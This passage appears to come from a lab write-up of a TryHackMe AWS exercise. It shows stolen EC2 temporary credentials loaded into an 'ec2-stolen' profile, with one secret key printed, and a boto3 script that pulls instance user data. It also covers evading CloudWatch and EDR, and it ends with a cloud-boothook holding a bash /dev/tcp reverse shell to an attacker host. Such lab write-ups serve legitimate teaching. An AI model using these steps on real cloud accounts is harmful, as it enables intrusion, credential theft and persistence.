  &quot;Expiration&quot; : &quot;2024-01-21T09:08:26Z&quot;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Take note of the &lt;em&gt;AccessKeyId&lt;/em&gt;, &lt;em&gt;SecretAccessKey&lt;/em&gt;, and &lt;em&gt;Token&lt;/em&gt;. The Access Key ID stars with the string “ASIA,” which confirms that this is a set of temporary credentials. In our workstation, we can “steal” this identity with &lt;em&gt;aws configure&lt;/em&gt;. We’ll call this profile &lt;em&gt;ec2-stolen&lt;/em&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~$ aws configure --profile ec2-stolen
AWS Access Key ID: ASIA...
AWS Secret Access Key: Ii+ENMOCljICwUF8N15Nf+6lnv/AF0ZfWrlZ97k5
# Use the default region and output format...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Use one more command to set the access token, replacing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;Token&amp;gt;&lt;/code&gt; with the long token value from the leaked credentials:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~$ aws configure --profile ec2-stolen set aws_access_token &amp;lt;Token&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Confirm your identity by comparing the original caller-identity information with that of the stolen credentials’ identity:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~$ aws sts get-caller-identity 
{
    &quot;UserId&quot;: &quot;AIDA...&quot;,
    &quot;Account&quot;: &quot;...&quot;,
    &quot;Arn&quot;: &quot;arn:aws:iam::&amp;lt;UserId&amp;gt;:user/&amp;lt;UserId&amp;gt;&quot;
}
~$ aws sts get-caller-identity --profile ec2-stolen
{
    &quot;UserId&quot;: &quot;AROA...&quot;,
    &quot;Account&quot;: &quot;...&quot;,
    &quot;Arn&quot;: &quot;arn:aws:sts::&amp;lt;UserId&amp;gt;:assumed-role/StarStarWAFRole/i-02c65bd50a06ee546&quot;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Use the stolen credentials to describe EC2 instances associated with this role:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~$ aws ec2 describe-instances --profile ec2-stolen
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From the output JSON, note the following fields:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;em&gt;Tags&lt;/em&gt;. The &lt;em&gt;Name&lt;/em&gt; tag’s &lt;em&gt;Value&lt;/em&gt; is, hopefully, a meaningful name for the instance.&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;InstanceId&lt;/em&gt;. Used in subsequent EC2 API calls or the AWS CLI.&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;InstanceType&lt;/em&gt;. Tells you what type of instance this is. Useful if you need to restart the instance.&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;PublicIpAddress&lt;/em&gt;. If &lt;em&gt;None&lt;/em&gt;, there is no way to directly access this instance from the web.&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;PrivateIpAddress&lt;/em&gt;. Allows you to move laterally, to other instances, throughout the VPC.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;Note: you can write a query in the AWS CLI to view these fields only for each instance.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;In this case, discovery returns the following instance names:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;em&gt;ApplicationInstance&lt;/em&gt;. Presumably, this runs the web application that contains &lt;em&gt;ssrf.php&lt;/em&gt;. If we gain access to the system, we will want its private IP to confirm that we are in the right place.&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;SecretInstance&lt;/em&gt;. Presumably, this is &lt;strong&gt;Instance B&lt;/strong&gt; within the private subnet. We will want to note its private IP so that, if we gain initial access to the Application instance, we can move laterally to this one.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let’s analyze each instance a bit further. The &lt;a href=&quot;https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_DescribeInstanceAttribute.html&quot;&gt;&lt;em&gt;ec2:DescribeImageAttribute&lt;/em&gt;&lt;/a&gt; API specification lists several attributes that are fair game for further analysis. For the purpose of system access, the most interesting one is the &lt;em&gt;userData&lt;/em&gt; attribute.&lt;/p&gt;

&lt;p&gt;The instance &lt;a href=&quot;https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html&quot;&gt;User Data&lt;/a&gt; defines automated actions, including startup commands or scripts. If we can access these, it may tell us key information about what each instance is doing, and may provide some hints for entry. If we can &lt;em&gt;modify&lt;/em&gt; these, then we can try to leverage both initial access and persistence into the environment.&lt;/p&gt;

&lt;p&gt;First, let’s see what each one is currently doing by retrieving the user data itself. The THM guide proposes a series of Bash commands which, during an engagement, you’re more likely to use. The following Python code, which leverages the &lt;a href=&quot;https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/ec2.html&quot;&gt;&lt;em&gt;boto3&lt;/em&gt; library&lt;/a&gt; does the same thing:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;boto3&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;botocore.config&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;instance_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;instance_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;private_ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;instance_name&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;instance_id&lt;/span&gt; 
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_data&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;private_ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;private_ip&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_instance_name_from_tags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tags_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tag&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tags_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Key&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Value&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_instance_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ec2_client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ec2_client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;describe_instances&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reservation&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Reservations&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reservation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Instances&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;InstanceId&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_instance_name_from_tags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Tags&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;private_ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;PrivateIpAddress&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;yield&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;private_ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_user_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ec2_client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;priv_ip&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_instance_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ec2_client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ec2_client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;describe_instance_attribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;Attribute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;userData&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InstanceId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;user_data_b64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;UserData&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Value&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;user_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user_data_b64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;yield&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;priv_ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;process_user_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ec2_client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_user_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ec2_client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;private_ip&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;---&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;
            &lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user_data&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-userdata.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;w+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;config&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;botocore&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;region_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;us-east-1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;boto3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;default&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ec2_client&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ec2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;process_user_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ec2_client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This should print and list the each instance’s ID, name, and user data, along with writing all of that to their own files. It’s a bit overkill for a task and challenge of this scale. Still, it gives us something to analyze.&lt;/p&gt;

&lt;p&gt;Key observations from the user data content:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;em&gt;ApplicationInstance&lt;/em&gt;. This is a simple Bash script. The &lt;em&gt;yum&lt;/em&gt; package manager is used to install some applications. Among those is &lt;a href=&quot;https://github.com/jorgebastida/awslogs&quot;&gt;&lt;em&gt;awslogs&lt;/em&gt;&lt;/a&gt;, which connects to &lt;a href=&quot;https://aws.amazon.com/cloudwatch/&quot;&gt;AWS CloudWatch&lt;/a&gt;. This means that our activity in the instance could be monitored by an Incident Response team. Since configuration is handled in this script, if we can modify or overwrite the contents, then we may be able to evade defenses to some capacity. This is trivial here but may prove valuable in a real-life pentest, where SOC teams might find you and shut you out.&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;SecretDataInstance&lt;/em&gt;. This is an AWS &lt;a href=&quot;https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html#user-data-cloud-init&quot;&gt;&lt;em&gt;cloud-init&lt;/em&gt;&lt;/a&gt; file. Two key takeaways. First, the &lt;em&gt;ssh_pwauth&lt;/em&gt; is set to &lt;em&gt;True&lt;/em&gt;, which would enable a user to enter the instance without asymmetric keys. Even better, the &lt;em&gt;chpasswd&lt;/em&gt; section includes the username and password needed to SSH into the instance. Likely, the developers implemented this weak configuration with hardcoded secrets because, they believed, the private cloud was impenetrable from the public internet. Time to prove them wrong.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The easiest way to gain initial access is to modify or replace one of these scripts. An easy way to do this is with a reverse shell. There are several ways to accomplish this, so we should cover the pros and cons:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;The THM guide proposes using &lt;em&gt;yum&lt;/em&gt; to install &lt;em&gt;nc&lt;/em&gt;, then invoke &lt;em&gt;nc&lt;/em&gt; to create the reverse shell. This is probably the “easiest” way to do this and is easier when systems ship with Netcat preinstalled. Unfortunately, a ton of EDR configurations will detect if &lt;em&gt;nc&lt;/em&gt; or &lt;em&gt;netcat&lt;/em&gt; are invoked, so this may not be the best way to catch this.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Another approach is to use &lt;a href=&quot;https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#bash-tcp&quot;&gt;Bash itself to create the TCP connection&lt;/a&gt;. The command uses &lt;a href=&quot;https://unix.stackexchange.com/a/241177&quot;&gt;port redirections&lt;/a&gt; and doesn’t leverage &lt;em&gt;nc&lt;/em&gt; or any other binary; and, because it’s running raw Bash, it may stand out &lt;em&gt;way&lt;/em&gt; less than a well-known command that’s easy to detect based on its filename and signature. The con is that you definitely need a Unix-like system running Bash version 2.0.4 or above. In addition, it can prove challenging to pull off and debug this kind of “remote shell-fu,” so tread lightly in real-world situations.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let’s try out the native Bash approach. Take care to use the AttackBox and use its public IP. We can write a Bash boot-hook with the following contents:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#cloud-boothook
#!/bin/bash -x
bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;AttackBoxPublicIP&amp;gt;/4444 0&amp;gt;&amp;amp;1
